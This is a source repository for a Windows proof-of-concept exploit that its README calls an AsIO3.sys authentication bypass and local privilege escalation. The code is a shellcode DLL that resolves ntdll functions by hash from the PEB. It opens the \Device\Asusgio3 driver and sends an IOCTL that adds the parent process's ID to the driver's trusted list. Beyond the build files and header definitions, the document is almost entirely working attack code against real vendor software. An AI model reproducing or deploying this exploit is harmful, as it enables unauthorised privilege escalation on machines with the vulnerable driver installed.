	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

```

`AsIO-shellcode.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30907.101
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AsIO-shellcode", "AsIO-shellcode\AsIO-shellcode.vcxproj", "{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x64.ActiveCfg = Debug|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x64.Build.0 = Debug|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x86.ActiveCfg = Debug|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x86.Build.0 = Debug|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x64.ActiveCfg = Release|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x64.Build.0 = Release|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x86.ActiveCfg = Release|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {E5E0360C-4B93-4976-91A5-D11B777842E0}
	EndGlobalSection
EndGlobal

```

`AsIO-shellcode/AsIO-shellcode.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{644ea8e4-891c-4c4d-bd75-d438a4c9b36d}</ProjectGuid>
    <RootNamespace>AsIOshellcode</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;ASIOSHELLCODE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>false</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;ASIOSHELLCODE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>false</ConformanceMode>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <DebugInformationFormat>None</DebugInformationFormat>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Native</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>false</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <AdditionalDependencies />
      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
      <GenerateMapFile>true</GenerateMapFile>
      <EntryPointSymbol>_entry</EntryPointSymbol>
      <NoEntryPoint>true</NoEntryPoint>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;ASIOSHELLCODE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;ASIOSHELLCODE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="framework.h" />
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ntdef.h" />
    <ClCompile Include="shellcode.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`AsIO-shellcode/AsIO-shellcode.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="framework.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ntdef.h">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="shellcode.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`AsIO-shellcode/ntdef.h`:

```h
#pragma once
#include <Windows.h>

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;

} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; 
            ULONG MarkedForRemoval : 1;
            ULONG ImageDll : 1; 
            ULONG LoadNotificationsSent : 1; 
            ULONG TelemetryEntryProcessed : 1; 
            ULONG ProcessStaticImport : 1; 
            ULONG InLegacyLists : 1;
            ULONG InIndexes : 1; 
            ULONG ShimDll : 1; 
            ULONG InExceptionTable : 1; 
            ULONG ReservedFlags1 : 2; 
            ULONG LoadInProgress : 1;
            ULONG LoadConfigProcessed : 1;
            ULONG EntryProcessed : 1;
            ULONG ProtectDelayLoad : 1; 
            ULONG ReservedFlags3 : 2; 
            ULONG DontCallForThreads : 1; 
            ULONG ProcessAttachCalled : 1;
            ULONG ProcessAttachFailed : 1; 
            ULONG CorDeferredValidate : 1; 
            ULONG CorImage : 1; 
            ULONG DontRelocate : 1; 
            ULONG CorILOnly : 1; 
            ULONG ChpeImage : 1; 
            ULONG ReservedFlags5 : 2;
            ULONG Redirected : 1; 
            ULONG ReservedFlags6 : 2; 
            ULONG CompatDatabaseProcessed : 1; 
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE* PLDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;


typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;

} PEB, * PPEB;
typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID( NTAPI* PIO_APC_ROUTINE )(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
 );

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;

typedef LONG KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define OBJ_INHERIT                         0x00000002L
#define OBJ_PERMANENT                       0x00000010L
#define OBJ_EXCLUSIVE                       0x00000020L
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_OPENIF                          0x00000080L
#define OBJ_OPENLINK                        0x00000100L
#define OBJ_KERNEL_HANDLE                   0x00000200L
#define OBJ_FORCE_ACCESS_CHECK              0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP   0x00000800L
#define OBJ_DONT_REPARSE                    0x00001000L
#define OBJ_VALID_ATTRIBUTES                0x00001FF2L

#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

```

`AsIO-shellcode/shellcode.cpp`:

```cpp
#include <Windows.h>
#include <intrin.h>

#include "ntdef.h"

#pragma comment(linker, "/merge:.rdata=.text")

typedef NTSTATUS( NTAPI* pNtCreateFile )(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_( EaLength ) PVOID EaBuffer,
	_In_ ULONG EaLength );

typedef NTSTATUS( NTAPI* pNtDeviceIoControlFile )(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG IoControlCode,
	_In_reads_bytes_opt_( InputBufferLength ) PVOID InputBuffer,
	_In_ ULONG InputBufferLength,
	_Out_writes_bytes_opt_( OutputBufferLength ) PVOID OutputBuffer,
	_In_ ULONG OutputBufferLength );

typedef VOID( NTAPI* pRtlInitUnicodeString )(
	_Out_ PUNICODE_STRING DestinationString,
	_In_opt_ PCWSTR SourceString );

typedef NTSTATUS( NTAPI* pNtDelayExecution )(
	_In_ BOOLEAN Alertable,
	_In_opt_ PLARGE_INTEGER DelayInterval );

typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )(
	_In_ HANDLE ProcessHandle,
	_In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
	_Out_writes_bytes_( ProcessInformationLength ) PVOID ProcessInformation,
	_In_ ULONG ProcessInformationLength,
	_Out_opt_ PULONG ReturnLength );


#define NtCreateFile_Hash		0x71e2bc4a
#define NtDeviceIoControlFile_Hash      0xc24c2e8e
#define RtlInitUnicodeString_Hash	0xcd51673e
#define NtDelayExecution_Hash           0x547718e5
#define NtQueryInformationProcess_Hash  0x47ccd80a

#define ASIO_ADDPID_IOCTL 0xA040A490

__forceinline unsigned long long comphash( char* c )
{
	unsigned long hash = 0;

	while ( *c != 0 )
	{
		hash ^= *c++;
		hash = _rotl( hash, 3 ) + 1;
	}

	return hash;
}

__forceinline void* get_export( void* image, DWORD fn_hash )
{
	PIMAGE_DOS_HEADER DosHeader = ( PIMAGE_DOS_HEADER ) image;
	if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE )
		return NULL;

	PIMAGE_NT_HEADERS NtHeader = ( PIMAGE_NT_HEADERS ) (( ULONG ) DosHeader + DosHeader->e_lfanew);
	if ( NtHeader->Signature != IMAGE_NT_SIGNATURE )
		return NULL;

	PIMAGE_EXPORT_DIRECTORY ExportDir = ( PIMAGE_EXPORT_DIRECTORY ) (( ULONG ) DosHeader + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);

	PULONG Names = ( PULONG ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfNames);
	PULONG Functions = ( PULONG ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfFunctions);
	PWORD Ordinals = ( PWORD ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfNameOrdinals);

	for ( SIZE_T i = 0; i < ExportDir->NumberOfNames; ++i )
	{
		char* name = ( char* ) (( ULONGLONG ) DosHeader + Names[ i ]);
		void* func = ( void* ) (( ULONGLONG ) DosHeader + Functions[ Ordinals[ i ] ]);

		if ( comphash( name ) == fn_hash )
			return func;
	}

	return NULL;
}

int _entry( void )
{
	pRtlInitUnicodeString RtlInitUnicodeString;
	pNtCreateFile NtCreateFile;
	pNtDelayExecution NtDelayExecution;
	pNtDeviceIoControlFile NtDeviceIoControlFile;
	pNtQueryInformationProcess NtQueryInformationProcess;

	OBJECT_ATTRIBUTES obj_attr;
	IO_STATUS_BLOCK io_status;

	PPEB peb = ( PPEB ) __readfsdword( 0x30 );

	PLDR_DATA_TABLE_ENTRY head = ( PLDR_DATA_TABLE_ENTRY ) peb->Ldr->InLoadOrderModuleList.Flink;
	PVOID ntdll_base = ( ( PLDR_DATA_TABLE_ENTRY ) head->InLoadOrderLinks.Flink )->DllBase;

	RtlInitUnicodeString = ( pRtlInitUnicodeString ) get_export( ntdll_base, RtlInitUnicodeString_Hash );
	NtCreateFile = ( pNtCreateFile ) get_export( ntdll_base, NtCreateFile_Hash );
	NtDelayExecution = ( pNtDelayExecution ) get_export( ntdll_base, NtDelayExecution_Hash );
	NtDeviceIoControlFile = ( pNtDeviceIoControlFile ) get_export( ntdll_base, NtDeviceIoControlFile_Hash );
	NtQueryInformationProcess = ( pNtQueryInformationProcess ) get_export( ntdll_base, NtQueryInformationProcess_Hash );

	if ( !RtlInitUnicodeString || !NtCreateFile || !NtDelayExecution || !NtDeviceIoControlFile || !NtQueryInformationProcess )
		goto FAILURE;

	NTSTATUS status = 0;

	wchar_t device_charmap[ ] = { L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', L'A', L's', L'u', L's', L'g', L'i', L'o', L'3', 0 };

	UNICODE_STRING device_name;
	RtlInitUnicodeString( &device_name, device_charmap );

	HANDLE dev_handle = INVALID_HANDLE_VALUE;
	InitializeObjectAttributes( &obj_attr, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL );

	status = NtCreateFile( &dev_handle, GENERIC_WRITE | GENERIC_READ, &obj_attr, &io_status, NULL, 0, 0, FILE_OPEN, 0, NULL, 0 );
	if ( !NT_SUCCESS( status ) )
		goto FAILURE;

	PROCESS_BASIC_INFORMATION pbi;
	RtlSecureZeroMemory( &pbi, sizeof( pbi ) );

	ULONG RetLength = 0;

	status = NtQueryInformationProcess( ( HANDLE ) -1, (PROCESS_INFORMATION_CLASS) 0, &pbi, sizeof( pbi ), &RetLength );
	if ( !NT_SUCCESS( status ) )
		goto FAILURE;

	ULONG inherit_pid = ( ULONG ) pbi.InheritedFromUniqueProcessId;
	ULONG out = 0;

	status = NtDeviceIoControlFile( dev_handle, NULL, NULL, NULL, &io_status, ASIO_ADDPID_IOCTL, &inherit_pid, sizeof( inherit_pid ), &out, sizeof ( out ) );
	if ( NT_SUCCESS( status ) )
	{
		LARGE_INTEGER time;
		time.QuadPart = -1;

		while ( TRUE )
			NtDelayExecution( 0, &time );
	}

FAILURE:
	__debugbreak();
	
	return 0;
}

```

`README.md`:

```md
# AsIO-Exploit
AsIO3.sys auth bypass and local privesc proof-of-concept

```